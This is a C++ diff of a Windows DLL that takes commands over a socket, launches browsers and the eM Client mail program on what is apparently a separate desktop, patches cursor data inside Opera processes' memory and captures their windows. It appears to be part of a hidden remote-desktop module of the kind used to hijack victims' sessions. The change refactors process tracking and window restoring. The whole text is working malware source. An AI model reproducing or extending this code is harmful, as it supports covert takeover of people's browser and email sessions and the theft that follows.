@@ -187,26 +187,6 @@ static DWORD_PTR GetModuleBaseAddress(DWORD pid, const wchar_t* modName) {
     return addr;
 }
 
-static bool IsProcessName(DWORD pid, const wstring& exeName) {
-    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
-    if (!hProcess) return false;
-    wchar_t path[MAX_PATH] = {0};
-    DWORD size = MAX_PATH;
-    bool match = false;
-    if (QueryFullProcessImageNameW(hProcess, 0, path, &size)) {
-        wstring fullPath = path;
-        size_t slash = fullPath.find_last_of(L"\\");
-        if (slash != wstring::npos) {
-            wstring name = fullPath.substr(slash + 1);
-            if (_wcsicmp(name.c_str(), exeName.c_str()) == 0) {
-                match = true;
-            }
-        }
-    }
-    CloseHandle(hProcess);
-    return match;
-}
-
 static bool patch_cursor_info(DWORD pid) {
     HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, pid);
     if (!hProcess) return false;
@@ -270,6 +250,7 @@ static bool patch_cursor_info(DWORD pid) {
 
 static vector<DWORD> g_patchedPids;
 static atomic<DWORD> g_emClientPid(0);
+static atomic_bool g_emClientRestored(false);
 
 static void patch_all_opera_processes() {
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -968,13 +949,14 @@ static void capture_loop() {
 
                 DWORD pid = 0;
                 GetWindowThreadProcessId(hwnd, &pid);
-                if (pid != 0 && IsProcessName(pid, L"MailClient.exe")) {
+                DWORD targetPid = g_emClientPid.load();
+                if (targetPid != 0 && pid == targetPid) {
                     wchar_t title[256] = {0};
                     GetWindowTextW(hwnd, title, 256);
                     LONG style = GetWindowLongW(hwnd, GWL_STYLE);
                     HWND owner = GetWindow(hwnd, GW_OWNER);
                     if (wcslen(title) > 0 && (style & WS_CAPTION) && owner == NULL) {
-                        if (IsIconic(hwnd) || !IsWindowVisible(hwnd)) {
+                        if (!g_emClientRestored.exchange(true)) {
                             ShowWindow(hwnd, SW_RESTORE);
                             SetForegroundWindow(hwnd);
                         }
@@ -2160,6 +2142,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             if (g_patchThread.joinable())   g_patchThread.join();
             g_patchedPids.clear();
             g_emClientPid = 0;
+            g_emClientRestored = false;
             release_all_bitmap_slots();
             g_dragging = false;
             g_dragHwnd = NULL;
@@ -2521,13 +2504,20 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     }
 
                     if (wRequestedPath == L"eM Client") {
-                        SetEnvironmentVariableW(L"WPF_DISABLE_HW_ACCELERATION", L"1");
+                        set_hw_acceleration_disabled();
                     }
 
-                    if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
-                                       0, NULL, NULL, &si, &pi)) {
+                    BOOL cpResult = CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
+                                                   0, NULL, NULL, &si, &pi);
+
+                    if (wRequestedPath == L"eM Client") {
+                        restore_hw_acceleration();
+                    }
+
+                    if (cpResult) {
                         if (wRequestedPath == L"eM Client") {
                             g_emClientPid = pi.dwProcessId;
+                            g_emClientRestored = false;
                         }
                         CloseHandle(pi.hProcess);
                         CloseHandle(pi.hThread);
@@ -2540,10 +2530,6 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     if (isGecko) {
                         SetEnvironmentVariableW(L"MOZ_FORCE_DISABLE_HARDWARE_ACCELERATION", NULL);
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", NULL);
-                    }
-
-                    if (wRequestedPath == L"eM Client") {
-                        SetEnvironmentVariableW(L"WPF_DISABLE_HW_ACCELERATION", NULL);
                     }
 
                     if (hCurrentDesktop) {
